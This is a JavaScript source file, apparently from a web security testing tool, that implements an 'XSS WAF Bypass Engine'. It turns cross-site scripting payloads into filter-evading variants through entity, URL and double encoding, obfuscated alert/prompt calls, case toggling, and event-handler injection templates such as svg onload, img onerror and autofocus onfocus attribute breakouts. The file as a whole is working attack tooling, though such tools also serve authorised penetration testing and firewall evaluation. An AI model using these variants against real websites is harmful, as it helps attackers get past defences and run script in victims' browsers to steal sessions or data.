/**
 * XSS WAF Bypass Engine
 * Generates multiple evasion variants for XSS payloads.
 * Supports: HTML Context, JS Context, Attribute Context
 */

import { urlEncode, htmlHexEncode, htmlDecimalEncode, alternatingCase, jsUnicodeEscape } from '../utils/encoding.js'
import { finalizeVariants } from '../utils/variants.js'

const globalCallPattern = /(?<![\w$.\]])(?:(window|globalThis|self)\s*\.\s*)?(alert|confirm|prompt)(?=\s*\()/g

function mapJavascriptCode(code, mapper) {
  let result = ''
  let start = 0
  let index = 0

  const appendCode = (end) => {
    result += mapper(code.slice(start, end))
  }

  while (index < code.length) {
    const char = code[index]
    const next = code[index + 1]
    const quote = char === "'" || char === '"' || char === '`' ? char : null

    if (quote) {
      appendCode(index)
      const protectedStart = index++
      while (index < code.length) {
        if (code[index] === '\\' && index + 1 < code.length) {
          index += 2
          continue
        }
        if (code[index++] === quote) break
      }
      result += code.slice(protectedStart, index)
      start = index
      continue
    }

    if (char === '/' && next === '*') {
      appendCode(index)
      const protectedStart = index
      const closing = code.indexOf('*/', index + 2)
      index = closing === -1 ? code.length : closing + 2
      result += code.slice(protectedStart, index)
      start = index
      continue
    }

    if (char === '/' && next === '/') {
      appendCode(index)
      const protectedStart = index
      const newline = code.indexOf('\n', index + 2)
      index = newline === -1 ? code.length : newline + 1
      result += code.slice(protectedStart, index)
      start = index
      continue
    }

    index += 1
  }

  appendCode(code.length)
  return result
}

function mapJavascriptContext(payload, target, mapper) {
  if (target === 'js') return mapJavascriptCode(payload, mapper)

  let transformed = payload.replace(/(<script\b[^>]*>)([\s\S]*?)(<\/script\s*>)/gi,
    (_match, opening, code, closing) => `${opening}${mapJavascriptCode(code, mapper)}${closing}`)

  transformed = transformed.replace(/(\bon\w+\s*=\s*)(["'])([\s\S]*?)\2/gi,
    (_match, prefix, quote, code) => `${prefix}${quote}${mapJavascriptCode(code, mapper)}${quote}`)

  transformed = transformed.replace(/(\bon\w+\s*=\s*)([^\s>]+)/gi,
    (_match, prefix, code) => `${prefix}${mapJavascriptCode(code, mapper)}`)

  return transformed === payload && !/<script\b|\bon\w+\s*=/i.test(payload)
    ? mapJavascriptCode(payload, mapper)
    : transformed
}

/* ── HTML Entity Encoding ─────────────────────────── */
function applyHtmlEntities(payload) {
  const variants = []
  // Hex entities
  variants.push(htmlHexEncode(payload))
  // Decimal entities
  variants.push(htmlDecimalEncode(payload))
  // Partial encoding — only encode < > " '
  const partial = payload
    .replace(/</g, '&#x3C;')
    .replace(/>/g, '&#x3E;')
    .replace(/"/g, '&#x22;')
    .replace(/'/g, '&#x27;')
  variants.push(partial)
  // Mixed hex/decimal
  const mixed = Array.from(payload)
    .map((c, index) => index % 2 === 0
      ? '&#x' + c.codePointAt(0).toString(16).toUpperCase() + ';'
      : '&#' + c.codePointAt(0) + ';'
    ).join('')
  variants.push(mixed)
  return variants
}

/* ── URL Encoding ─────────────────────────────────── */
function applyUrlEncoding(payload) {
  const variants = []
  variants.push(urlEncode(payload))
  // Only encode special chars
  const partial = payload
    .replace(/</g, '%3C')
    .replace(/>/g, '%3E')
    .replace(/"/g, '%22')
    .replace(/'/g, '%27')
    .replace(/\(/g, '%28')
    .replace(/\)/g, '%29')
  variants.push(partial)
  return variants
}

/* ── JS Function Obfuscation ─────────────────────── */
function applyJsObfuscation(payload, target) {
  const names = [...payload.matchAll(globalCallPattern)].map((match) => match[2])
  if (names.length === 0) return []

  const replaceCalls = (factory) => mapJavascriptContext(payload, target, (code) =>
    code.replace(globalCallPattern, (_match, _receiver, name) => factory(name)))
  return [
    replaceCalls((name) => `window['${name.slice(0, 2)}'+'${name.slice(2)}']`),
    replaceCalls((name) => `globalThis['${name.slice(0, 1)}'+'${name.slice(1)}']`),
    replaceCalls((name) => `self['${name}']`),
    replaceCalls((name) => `window[String.fromCharCode(${Array.from(name).map((char) => char.charCodeAt(0)).join(',')})]`),
  ]
}

/* ── Tag & Event Variation ────────────────────────── */
function extractJavascript(payload) {
  const script = payload.match(/<script[^>]*>([\s\S]*?)<\/script>/i)
  if (script) return script[1]
  const handler = payload.match(/on\w+\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/i)
  return handler ? (handler[1] ?? handler[2] ?? handler[3]) : payload
}

function escapeAttribute(code) {
  return code.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
}

function applyTagVariation(payload, target) {
  const variants = []
  const jsCode = extractJavascript(payload)
  if (!jsCode.trim()) return variants
  const attrCode = escapeAttribute(jsCode)

  if (target === 'js') return variants
  if (target === 'attr') {
    return [
      `" autofocus onfocus="${attrCode}" x="`,
      `" onpointerenter="${attrCode}" x="`,
      `" onmouseover="${attrCode}" x="`,
    ]
  }

  // svg/onload
  variants.push(`<svg onload="${attrCode}"></svg>`)

  // img/onerror
  variants.push(`<img src=x onerror="${attrCode}">`)

  // body/onload
  variants.push(`<body onload="${attrCode}">`)
  variants.push(`<body onpageshow="${attrCode}">`)

  // details/ontoggle
  variants.push(`<details open ontoggle="${attrCode}"></details>`)

  // iframe/onload
  variants.push(`<iframe onload="${attrCode}"></iframe>`)

  // input/onfocus + autofocus
  variants.push(`<input onfocus="${attrCode}" autofocus>`)

  // marquee
  variants.push(`<marquee onstart="${attrCode}"></marquee>`)

  // video/source onerror
  variants.push(`<video><source onerror="${attrCode}"></video>`)

  return variants
}

/* ── Case Toggling for XSS ────────────────────────── */
function applyCaseToggle(payload) {
  return [0, 1].map((offset) => {
    let result = payload
    result = result.replace(/<\/?([a-z][\w:-]*)/gi, (match, tag) => match.replace(tag, alternatingCase(tag, offset)))
    result = result.replace(/\bon([a-z]+)\s*=/gi, (_match, event) => `on${alternatingCase(event, offset)}=`)
    return result
  })
}

/* ── Mixed Encoding ───────────────────────────────── */
function applyEncodingMix(payload, target) {
  const variants = []

  if (target === 'js' || target === 'attr') {
    const escapedFunctions = payload.replace(/\b(alert|confirm|prompt)(?=\s*\()/g, (name) => jsUnicodeEscape(name))
    if (escapedFunctions !== payload) variants.push(escapedFunctions)
    return variants
  }

  const callable = /\b(alert|confirm|prompt)(?=\s*\()/g

  // HTML entities + JS unicode for function names
  let v1 = payload
    .replace(/</g, '&#x3C;')
    .replace(/>/g, '&#x3E;')
  v1 = v1.replace(callable, (name) => jsUnicodeEscape(name))
  variants.push(v1)

  // URL encode tags, HTML encode JS
  let v2 = payload
    .replace(/</g, '%3C')
    .replace(/>/g, '%3E')
    .replace(callable, (name) => htmlHexEncode(name))
  variants.push(v2)

  // Double encode angle brackets
  let v3 = payload
    .replace(/</g, '%253C')
    .replace(/>/g, '%253E')
  variants.push(v3)

  // JS hex escapes inside event handlers
  let v4 = payload.replace(callable, (name) => Array.from(name)
    .map((char) => `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`)
    .join(''))
  variants.push(v4)

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateXssVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('html-entities')) {
    applyHtmlEntities(payload).forEach(v => {
      allVariants.push({
        payload: v,
        label: 'HTML Entities',
        layers: ['html-entities'],
        validity: 'conditional',
        note: 'Requires a downstream decode/reparse step; entity-encoded markup is text in a direct HTML data context.',
      })
    })
  }

  if (layers.includes('url-encoding')) {
    applyUrlEncoding(payload).forEach(v => {
      allVariants.push({
        payload: v,
        label: 'URL Encoding',
        layers: ['url-encoding'],
        validity: 'conditional',
        note: 'Use in a URL-decoded request parameter, not as literal HTML or JavaScript.',
      })
    })
  }

  if (layers.includes('js-obfuscation')) {
    applyJsObfuscation(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'JS Obfuscation', layers: ['js-obfuscation'], validity: 'validated' })
    })
  }

  if (layers.includes('tag-variation')) {
    applyTagVariation(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Tag Variation', layers: ['tag-variation'], validity: 'conditional', note: `Generated for ${target} context; CSP and sanitization still apply.` })
    })
  }

  if (layers.includes('case-toggle')) {
    applyCaseToggle(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Case Toggle', layers: ['case-toggle'], validity: 'validated' })
    })
  }

  if (layers.includes('encoding-mix')) {
    applyEncodingMix(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Mixed Encoding', layers: ['encoding-mix'], validity: 'conditional', note: `Encoding behavior depends on the ${target} injection context.` })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('tag-variation') && layers.includes('case-toggle')) {
      applyTagVariation(payload, target).slice(0, 3).forEach(tv => {
        const cased = applyCaseToggle(tv)[0]
        allVariants.push({ payload: cased, label: 'Tag + Case', layers: ['tag-variation', 'case-toggle'] })
      })
    }

    if (layers.includes('tag-variation') && layers.includes('url-encoding')) {
      applyTagVariation(payload, target).slice(0, 2).forEach(tv => {
        const encoded = tv.replace(/</g, '%3C').replace(/>/g, '%3E').replace(/"/g, '%22')
        allVariants.push({ payload: encoded, label: 'Tag + URL', layers: ['tag-variation', 'url-encoding'] })
      })
    }
  }

  return finalizeVariants(allVariants, layers)
}
